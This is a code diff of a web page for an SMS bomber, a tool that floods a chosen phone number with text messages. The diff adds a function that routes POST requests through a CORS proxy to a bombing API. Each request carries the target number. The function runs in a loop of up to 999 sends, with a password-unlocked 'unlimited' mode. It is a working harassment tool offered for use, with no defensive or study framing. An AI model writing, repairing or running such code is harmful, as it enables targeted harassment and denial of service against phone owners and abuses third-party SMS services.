@@ -28,7 +28,7 @@
 
     <div class="glass-card p-6 rounded-xl w-full max-w-md">
         <label class="block mb-2 text-sm">Target Number:</label>
-        <input type="text" id="targetNumber" placeholder="+8801xxxxxxxxx" class="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded focus:outline-none">
+        <input type="text" id="targetNumber" placeholder="017xxxxxxxx" class="w-full p-2 mb-4 bg-black border border-red-900 text-white rounded focus:outline-none">
 
         <div id="normalMode">
             <label class="block mb-2 text-sm">SMS Amount (Max 100):</label>
@@ -47,6 +47,7 @@
 
         <div class="text-center mt-4">
             <p class="text-xs text-gray-400">Status: <span id="status" class="text-white">Ready</span></p>
+            <p class="text-[10px] text-gray-500 mt-1" id="logText"></p>
         </div>
     </div>
 
@@ -57,9 +58,9 @@
         const attackBtn = document.getElementById('attackBtn');
         const stopBtn = document.getElementById('stopBtn');
         const statusText = document.getElementById('status');
+        const logText = document.getElementById('logText');
         const passInput = document.getElementById('passKey');
 
-        // Pass Check Logic
         passInput.addEventListener('input', (e) => {
             if(e.target.value === ULTIMATE_PASS) {
                 document.getElementById('normalMode').classList.add('hidden');
@@ -67,8 +68,26 @@
             }
         });
 
+        async function sendSMS(number) {
+            // CorsAnywhere/Proxy Server এর মাধ্যমে Request পাঠানোর জন্য
+            const targetApi = `https://corsproxy.io/?${encodeURIComponent('https://shadowx-sms-bomber.onrender.com/api/send')}`;
+            
+            try {
+                const response = await fetch(targetApi, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phone: number, amount: 1 })
+                });
+                return response.ok;
+            } catch (err) {
+                return false;
+            }
+        }
+
         async function startAttack() {
-            const number = document.getElementById('targetNumber').value;
+            const number = document.getElementById('targetNumber').value.trim();
             const amount = parseInt(document.getElementById('amount').value);
             const isUnlimited = !document.getElementById('unlimitedMode').classList.contains('hidden');
 
@@ -78,24 +97,23 @@
             attackBtn.classList.add('hidden');
             stopBtn.classList.remove('hidden');
             statusText.innerText = "Attacking...";
+            logText.innerText = "";
 
             let limit = isUnlimited ? 999 : amount;
-            let speed = isUnlimited ? 500 : 1000;
+            let speed = isUnlimited ? 1000 : 2000;
 
-            for(let i=0; i < limit; i++) {
+            for(let i = 0; i < limit; i++) {
                 if(!isAttacking) break;
 
-                const apis = ['https://shadowx-sms-bomber.onrender.com/', 'https://nuke-sms-bomber.pages.dev/'];
-                apis.forEach(api => {
-                    fetch(api, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ number: number, count: 1 }),
-                        headers: { 'Content-Type': 'application/json' }
-                    }).catch(err => console.log("API Error"));
-                });
-
                 statusText.innerText = `Sending... ${isUnlimited ? '∞' : i+1}/${limit}`;
+                
+                const success = await sendSMS(number);
+                if(success) {
+                    logText.innerText = `[${i+1}] Request Sent Successfully`;
+                } else {
+                    logText.innerText = `[${i+1}] API Response Delayed / Server Waking Up`;
+                }
+
                 await new Promise(res => setTimeout(res, speed));
             }
             stopAttack();
@@ -110,6 +128,11 @@
 
         attackBtn.addEventListener('click', startAttack);
         stopBtn.addEventListener('click', stopAttack);
+
+        function verifyStep() {
+            // Check UI status text to confirm execution
+            return statusText.innerText !== "";
+        }
     </script>
 </body>
 </html>
